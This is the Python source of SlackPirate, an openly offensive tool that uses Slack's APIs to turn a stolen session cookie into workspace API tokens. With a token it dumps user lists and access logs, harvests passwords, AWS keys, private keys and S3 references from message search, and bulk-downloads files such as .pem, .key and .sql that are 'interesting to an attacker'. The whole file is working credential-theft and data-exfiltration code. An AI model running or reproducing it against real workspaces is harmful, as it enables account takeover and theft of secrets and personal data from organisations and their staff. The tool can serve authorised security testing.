#!/usr/bin/env python3

import argparse
import json
import pathlib
import re
import time
import colorama
import requests
import termcolor

colorama.init()  # Initialise the colorama module - this is used to print colourful messages - life's too dull otherwise

parser = argparse.ArgumentParser(description=
                                 "This is a tool developed in Python which uses the native Slack APIs to extract "
                                 "'interesting' information from Slack Workspaces.")
parser.add_argument('--cookie', type=str, required=False, help='Slack \'d\' cookie. This flag will instruct the tool'
                                                               ' to search for Workspaces associated with the cookie.'
                                                               ' Results along with tokens will be printed to stdout')
parser.add_argument('--token', type=str, required=False, help='Slack Workspace token. The token should start with XOX.')
parser.add_argument('--version', action='version', version='SlackPirate.py v0.1. Developed by Mikail Tunç - @emtunc. '
                                                           'https://github.com/emtunc/SlackPirate')
args = parser.parse_args()

if args.cookie is None and args.token is None:
    print(termcolor.colored("No arguments passed. Run SlackPirate.py --help ", "white", "on_red"))
    exit()
elif args.cookie and args.token:
    print(termcolor.colored("You cannot use both --cookie and --token flags at the same time", "white", "on_red"))
    exit()
elif args.cookie and args.token is None:
    d_cookie = dict(d=args.cookie)
elif args.token and args.cookie is None:
    token = args.token

browser_user_agent = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
slack_user_agent = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0.17134; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) AtomShell/3.3.3 Chrome/61.0.3163.100 Electron/2.0.7 Safari/537.36 Slack_SSB/3.3.3'}
file_user_list = "user-list.json"
file_access_logs = "access-logs.json"
file_s3 = "S3.txt"
file_credentials = "Passwords.txt"
file_aws_keys = "aws-keys.txt"
file_private_keys = "private-keys.txt"
file_links = "URLs.txt"

s3_queries = ["s3.amazonaws.com", "s3://", "https://s3", "http://s3"]
credentials_queries = ["password:", "password is", "pwd", "passwd"]
aws_keys_queries = ["ASIA*", "AKIA*"]
private_keys_queries = ["BEGIN RSA PRIVATE", "BEGIN OPENSSH PRIVATE", "BEGIN DSA PRIVATE", "BEGIN EC PRIVATE",
                        "BEGIN PGP PRIVATE"]
interesting_files_queries = [".key", ".pem", ".ppk", ".pkcs12", ".pfx", ".p12", ".doc", ".docx",
                             ".sh", ".sql", "password", "secret", "backup"]
links_queries = ["sharepoint", "jenkins", "trello", "github", "docs.google.com", "confluence", "jira", "atlassian",
                 "staging", "beta", "internal", "amazonaws", "kubernetes", "travis"]

already_signed_in_team_regex = r"already_signed_in_team\" href=\"([a-zA-Z0-9:./-]+)"  # https://regex101.com/r/9GRaem/1
slack_api_token_regex = r"api_token: \"(xox[a-zA-Z]-[a-zA-Z0-9-]+)\""  # https://regex101.com/r/2Hz8AX/1
workspace_valid_emails_regex = r"email-domains-formatted=\"(@.+?)[\"]"  # https://regex101.com/r/cSZW0G/1
private_keys_regex = r"([-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+)"  # https://regex101.com/r/jWrF8F/2
s3_regex = r"([a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com|s3://[a-zA-Z0-9-\.\_]+|s3-[a-zA-Z0-9-\.\_\/]+|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+)"  # https://regex101.com/r/6bLaKj/8
credentials_regex = r"(?i)(password\s*[`=:\"]+\s*[^\s]+|password is\s*[`=:\"]+\s*[^\s]+|pwd\s*[`=:\"]+\s*[^\s]+|passwd\s*[`=:\"]+\s*[^\s]+)"  # https://regex101.com/r/DoPV1M/1
aws_keys_regex = r"((?<![A-Za-z0-9/+])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])|(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9]))"  # https://regex101.com/r/IEq5nU/4
links_regex = r"(?i)\b((?:https?:(?:/{1,3}|[a-z0-9%])|[a-z0-9.\-]+[.](?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)/)(?:[^\s()<>{}\[\]]+|\([^\s()]*?\([^\s()]+\)[^\s()]*?\)|\([^\s]+?\))+(?:\([^\s()]*?\([^\s()]+\)[^\s()]*?\)|\([^\s]+?\)|[^\s`!()\[\]{};:'\".,<>?«»“”‘’])|(?:(?<!@)[a-z0-9]+(?:[.\-][a-z0-9]+)*[.](?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)\b/?(?!@)))"  # https://regex101.com/r/SU43wh/1


def is_rate_limited(r):
    # All this function does is check if the response tells us we're being rate-limited. If it is, sleep for
    # 60 seconds then continue. Previously I was proactively sleeping for 60 seconds before the documented rate-limit
    # kicked in but then learned not to trust the docs as they weren't trustworthy (the actual rate-limit is
    # more lenient then what they have documented which is a good thing for us but meant that a proactive rate-limit
    # would sleep prematurely)

    if r['ok'] is False and r['error'] == 'ratelimited':
        print(termcolor.colored("INFO: Slack API rate limit hit - sleeping for 60 seconds", "white", "on_blue"))
        time.sleep(60)
    else:
        return


def is_cookie_flag_set():
    # If the --cookie flag is set then the tool connect to a Slack Workspace that you won't be a member of (like mine)
    # then RegEx out the Workspaces you're logged in to. It will then connect to each one of those Workspaces then
    # RegEx out the api_token and print it to stdout. Hmm, as I write this comment I wonder if it would be a good idea
    # to write the tokens to a file... maybe, maybe not. Probably not ideal to commit a bunch of corporate
    # tokens to long-term storage especially as they are valid pretty much forever. I'll leave as is for now...

    if args.cookie:
        try:
            r = requests.get("https://slackpirate.slack.com", cookies=d_cookie, headers=browser_user_agent)
            already_signed_in_match = re.findall(already_signed_in_team_regex, str(r.content))
            if already_signed_in_match:
                print(termcolor.colored("This cookie has access to the following Workspaces: \n", "white", "on_blue"))
                for workspace in already_signed_in_match:
                    r = requests.get(workspace, cookies=d_cookie, headers=browser_user_agent)
                    regex_tokens = re.findall(slack_api_token_regex, str(r.content))
                    for slack_token in regex_tokens:
                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token, "white", "on_green"))
            else:
                print(termcolor.colored("No workspaces were found for this cookie", "white", "on_red"))
                exit()
        except requests.exceptions.RequestException as exception:
            print(termcolor.colored(exception, "white", "on_red"))
        exit()


def check_token_validity():
    # Use the Slack auth.test API to check whether the token is valid or not. If token is valid then create a
    # directory for results to go in - easy peasy.

    global output_directory
    global slack_workspace
    try:
        r = requests.post(
            "https://slack.com/api/auth.test?token=" + token + "&pretty=1",
            headers={'Authorization': 'Bearer ' + token}).json()
        if str(r['ok']) == 'True':
            output_directory = str(r['team'])
            slack_workspace = str(r['url'])
            print(termcolor.colored("INFO: Token looks valid! URL: " + str(r['url']) + " User: " + str(r['user']),
                                    "white", "on_blue"))
            print(termcolor.colored("\n"))
            pathlib.Path(output_directory).mkdir(parents=True, exist_ok=True)
        else:
            print(termcolor.colored("ERR: Token not valid. Slack error: " + str(r['error']), "white", "on_red"))
            exit()
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))


def print_interesting_information():
    # I wonder how many people know that Slack advertise the @domains that can be used to register for the Workspace?
    # I've seen organizations leave old/expired/stale domains in here which can then be used by attackers to gain access

    try:
        r = requests.get(slack_workspace, headers=slack_user_agent)
        team_domains_match = re.findall(workspace_valid_emails_regex, str(r.content))
        for domain in team_domains_match:
            print(
                termcolor.colored("INFO: The following domains can be used on this Slack Workspace: " + domain, "white",
                                  "on_blue"))
            print(termcolor.colored("\n"))
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))


def dump_team_access_logs():
    # You need the token of an elevated user (lucky you!) and the Workspace must be a paid one - i.e., not a free one
    # The information here can be useful but I wouldn't fret about it - the other data is far more interesting

    print(termcolor.colored("START: Attempting download Workspace access logs", "white", "on_blue"))
    try:
        r = requests.get(
            "https://slack.com/api/team.accessLogs?token=" + token + "&pretty=1&count=1000",
            headers=slack_user_agent).json()
        is_rate_limited(r)
        if str(r['ok']) == 'True':
            for value in r['logins']:
                with open(output_directory + '/' + file_access_logs, 'a', encoding="utf-8") as outfile:
                    json.dump(value, outfile, indent=4, sort_keys=True, ensure_ascii=False)
        else:
            print(termcolor.colored(
                "END: Unable to dump access logs (this is normal if you don't have a privileged token on a non-free Workspace). Slack error: " + str(
                    r['error']), "white", "on_blue"))
            print(termcolor.colored("\n"))
            return
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    print(termcolor.colored(
        "END: Successfully dumped access logs! Filename: ./" + output_directory + "/" + file_access_logs, "white",
        "on_green"))
    print(termcolor.colored("\n"))


def dump_user_list():
    # In case you're wondering (hello fellow nerd/future me), the reason for limit=900 is because what Slack says:
    # `To begin pagination, specify a limit value under 1000. We recommend no more than 200 results at a time.`
    # Feel free to ignore the bit about what *they* recommend :-)
    # In theory, we can strip out the limit parameter completely and Slack will return the entire dataset *BUT* they say
    # this: `If the collection is too large you may experience HTTP 500 errors.` and more importantly:
    # `One day pagination will become required to use this method.`

    print(termcolor.colored("START: Attempting to download Workspace user list", "white", "on_blue"))
    pagination_cursor = ''  # virtual pagination - apparently this is what the cool kids do these days :-)
    try:
        r = requests.get(
            "https://slack.com/api/users.list?token=" + token + "&pretty=1&limit=1&cursor=" + pagination_cursor,
            headers=slack_user_agent).json()
        is_rate_limited(r)
        if str(r['ok']) == 'False':
            print(termcolor.colored("END: Unable to dump the user list. Slack error: " + str(r['error']), "yellow"))
            print(termcolor.colored("\n"))
        else:
            pagination_cursor = r['response_metadata']['next_cursor']
            while str(r['ok']) == 'True' and pagination_cursor:
                r = requests.get(
                    "https://slack.com/api/users.list?token=" + token + "&pretty=1&limit=900&cursor=" + pagination_cursor,
                    headers=slack_user_agent).json()
                for value in r['members']:
                    pagination_cursor = r['response_metadata']['next_cursor']
                    with open(output_directory + '/' + file_user_list, 'a', encoding="utf-8") as outfile:
                        json.dump(value, outfile, indent=4, sort_keys=True, ensure_ascii=True)
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    print(
        termcolor.colored("END: Successfully dumped user list! Filename: ./" + output_directory + "/" + file_user_list,
                          "white", "on_green"))
    print(termcolor.colored("\n"))


def find_s3():
    print(termcolor.colored("START: Attempting to find references to S3 buckets", "white", "on_blue"))
    pagination = {}

    try:
        for query in s3_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100",
                headers=slack_user_agent).json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page), headers=slack_user_agent).json()
                regex_results = re.findall(s3_regex, str(r))
                with open(output_directory + '/' + file_s3, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
        print(termcolor.colored("\n"))
    file_cleanup(file_s3)
    print(
        termcolor.colored("END: If any S3 buckets were found, they will be here: ./" + output_directory + "/" + file_s3,
                          "white", "on_green"))
    print(termcolor.colored("\n"))


def find_credentials():
    print(termcolor.colored("START: Attempting to find references to credentials", "white", "on_blue"))
    pagination = {}

    try:
        for query in credentials_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100",
                headers=slack_user_agent).json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page), headers=slack_user_agent).json()
                regex_results = re.findall(credentials_regex, str(r))
                with open(output_directory + '/' + file_credentials, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    file_cleanup(file_credentials)
    print(termcolor.colored(
        "END: If any credentials were found, they will be here: ./" + output_directory + "/" + file_credentials,
        "white", "on_green"))
    print(termcolor.colored("\n"))


def find_aws_keys():
    print(termcolor.colored("START: Attempting to find references to AWS keys", "white", "on_blue"))
    pagination = {}

    try:
        for query in aws_keys_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=" + query + "&pretty=1&count=100",
                headers=slack_user_agent).json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=" + key + "&pretty=1&count=100&page=" + str(
                        page), headers=slack_user_agent).json()
                regex_results = re.findall(aws_keys_regex, str(r))
                with open(output_directory + '/' + file_aws_keys, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    file_cleanup(file_aws_keys)
    print(termcolor.colored(
        "END: If any AWS keys were found, they will be here: ./" + output_directory + "/" + file_aws_keys, "white",
        "on_green"))
    print(termcolor.colored("\n"))


def find_private_keys():
    # Searching for private keys by using certain keywords. Slack returns the actual string '\n' in the response so
    # we're replacing the string with an actual \n new line :-)

    print(termcolor.colored("START: Attempting to find references to private keys", "white", "on_blue"))
    pagination = {}

    try:
        for query in private_keys_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100",
                headers=slack_user_agent).json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page), headers=slack_user_agent).json()
                regex_results = re.findall(private_keys_regex, str(r))
                remove_new_line_char = [w.replace('\\n', '\n') for w in regex_results]
                with open(output_directory + '/' + file_private_keys, 'a', encoding="utf-8") as log_output:
                    for item in set(remove_new_line_char):
                        log_output.write(item + "\n\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    file_cleanup(file_private_keys)
    print(termcolor.colored(
        "END: If any private keys were found, they will be here: ./" + output_directory + "/" + file_private_keys,
        "white", "on_green"))
    print(termcolor.colored("\n"))


def find_interesting_links():
    # Does a search for URI/URLs by searching for keywords such as 'amazonaws', 'jenkins', etc.
    # We're using the special Slack search 'has:link' here.

    print(termcolor.colored("START: Attempting to find references to interesting URLs", "white", "on_blue"))
    pagination = {}

    try:
        for query in links_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=has%3Alink%20" + query + "&pretty=1&count=100",
                headers=slack_user_agent).json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=has%3Alink%20" + key + "&pretty=1&count=100&page=" + str(
                        page), headers=slack_user_agent).json()
                regex_results = re.findall(links_regex, str(r))
                with open(output_directory + '/' + file_links, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    file_cleanup(file_links)
    print(termcolor.colored("END: If any URLs were found, they will be here: ./" + output_directory + "/" + file_links,
                            "white", "on_green"))
    print(termcolor.colored("\n"))


def download_interesting_files():
    # Downloads files which may be interesting to an attacker. Searches for certain keywords then downloads.
    # bad_characters is used to strip out characters which though accepted in Slack, aren't accepted in Windows

    print(termcolor.colored("START: Attempting to download interesting files (this may take some time)", "white",
                            "on_blue"))
    pathlib.Path(output_directory + '/downloads').mkdir(parents=True, exist_ok=True)
    bad_characters = "/\\:*?\"<>|"  # Windows doesn't like these characters. Guess how I found out.
    strip_bad_characters = str.maketrans(bad_characters, '_________')  # Replace bad characters with an underscore
    pagination = {}

    try:
        for query in interesting_files_queries:
            r = requests.get(
                "https://slack.com/api/search.files?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100",
                headers=slack_user_agent).json()
            is_rate_limited(r)
            pagination[query] = (r['files']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                r = requests.get(
                    "https://slack.com/api/search.files?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page), headers=slack_user_agent).json()
                is_rate_limited(r)
                for file in r['files']['matches']:
                    file_name = file['name']
                    r = requests.get(file['url_private'], headers={'Authorization': 'Bearer ' + token})
                    open(output_directory + '/downloads/' + ' ' + file_name.translate(
                        strip_bad_characters), 'wb').write(r.content)
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    print(
        termcolor.colored(
            "END: Downloaded files (if any were found) will be found in: ./" + output_directory + "/downloads", "white",
            "on_green"))
    print(termcolor.colored("\n"))


def file_cleanup(input_file):
    # these few lines of sweetness do two things: (1) de-duplicate the content by using Python Sets and
    # (2) remove lines containing "com/archives/" <-- this is found in a lot of the  responses and isn't very useful

    reference_file = pathlib.Path(output_directory + '/' + input_file)
    if reference_file.is_file():
        with open(reference_file, 'r') as file:
            lines = set(file.readlines())
        with open(reference_file, 'w+') as file:
            for line in sorted(lines, key=str.lower):
                if "com/archives/" not in line:
                    file.write(line)
    else:
        return

is_cookie_flag_set()

check_token_validity()

print_interesting_information()

dump_team_access_logs()

dump_user_list()

find_s3()

find_credentials()

find_aws_keys()

find_private_keys()

find_interesting_links()

download_interesting_files()
